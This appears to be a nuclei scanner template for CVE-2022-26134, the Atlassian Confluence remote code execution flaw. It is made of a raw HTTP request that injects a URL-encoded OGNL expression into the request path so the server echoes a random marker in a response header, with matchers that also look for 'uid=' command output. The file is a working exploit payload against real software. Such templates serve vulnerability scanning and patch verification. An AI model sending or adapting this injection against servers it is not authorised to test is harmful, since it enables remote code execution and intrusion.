id: atlassian_confluence_CVE_2022_26134_RCE
info:
  author: 51pwn
  name: atlassian_confluence_CVE_2022_26134_RCE
  reference:
  - https://github.com/hktalent/nuclei-templates
  - https://51pwn.com
  severity: critical
  tags: atlassian,confluence,CVE-2022-26134,web,RCE
requests:
- attack: pitchfork
  cookie-reuse: true
  extractors:
  - name: uid
    part: header
    regex:
    - (uid=[^\n\r\\]+)
    type: regex
  - name: host
    part: header
    regex:
    - ({{randstr}})
    type: regex
  matchers:
  - part: header
    regex:
    - (uid=[^\n\r\\]+)
    type: regex
  - condition: or
    part: header
    type: word
    words:
    - 'Host: {{randstr}}'
  payloads:
    mypaths:
    - /bootstrap
    - ''
  raw:
  - 'GET {{mypaths}}/{{CheckPayload1}} HTTP/1.1

    Host: {{Hostname}}

    User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/97.0.4692.71 Safari/537.36

    Accept:*/*

    Pragma:no-cache

    Accept-Encoding:gzip, deflate

    Connection: close

    Content-Length: 0


    '
  req-condition: true
  stop-at-first-match: true
  unsafe: true
variables:
  CheckPayload1: '%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22Host%22%2C%22{{randstr}}%22%29%7D/'
